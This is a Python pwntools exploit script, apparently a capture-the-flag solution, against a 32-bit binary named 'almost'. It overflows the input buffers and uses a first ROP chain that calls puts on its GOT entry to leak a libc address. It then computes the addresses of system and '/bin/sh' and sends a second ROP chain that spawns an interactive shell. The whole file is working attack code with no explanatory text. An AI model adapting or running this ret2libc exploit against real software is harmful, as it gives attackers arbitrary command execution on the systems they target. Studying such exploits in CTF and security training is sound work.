from pwn import *
context.arch='i386'
elf = ELF('./almost')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    #host = 'jh2i.com'
    #port = 50017
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil(':')
io.sendline('B' * 0x100)
io.recvuntil(':')
io.sendline('B' * 80)
io.recvuntil(':')

#leak libc, call main again
rop = flat([
	'D'*0x10,
	elf.sym.puts,
	elf.sym.main,
	elf.got['puts']
])

io.sendline(rop)
io.recvn(0x122)
leaked = u32(io.recvn(4))
libc_base = leaked - libc.sym['puts']
libc_system = libc_base + libc.sym['system']
binsh = next(libc.search("/bin/sh"))
libc_binsh = libc_base + binsh
log.info("Leaked: {}".format(hex(leaked)))
log.info("Libc_base: {}".format(hex(libc_base)))
log.info("Libc_system: {}".format(hex(libc_system)))
log.info("Libc_binsh: {}".format(hex(libc_binsh)))
log.info("binsh: {}".format(hex(binsh)))
io.recvuntil(':')
io.sendline('B' * 0x100)
io.recvuntil(':')
io.sendline('B' * 80)
io.recvuntil(':')

#call system('/bin/sh')
rop = flat([
	'D' * 0x10,
	libc_system,
	0x41414141,
	libc_binsh
])
io.sendline(rop)
io.interactive()